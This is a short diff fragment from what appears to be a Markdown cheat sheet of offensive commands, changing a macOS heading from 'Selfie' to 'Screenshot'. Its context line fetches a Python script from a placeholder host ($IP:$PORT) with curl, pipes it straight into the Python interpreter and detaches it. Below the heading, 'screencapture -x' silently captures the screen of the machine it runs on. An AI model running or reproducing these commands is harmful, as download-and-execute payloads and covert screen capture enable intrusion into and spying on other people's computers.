@@ -21,7 +21,7 @@ curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killal
 ```
 
 ## macOS:
-### Selfie
+### Screenshot
 ```
 screencapture -x /tmp/screenshot.jpg
 ```
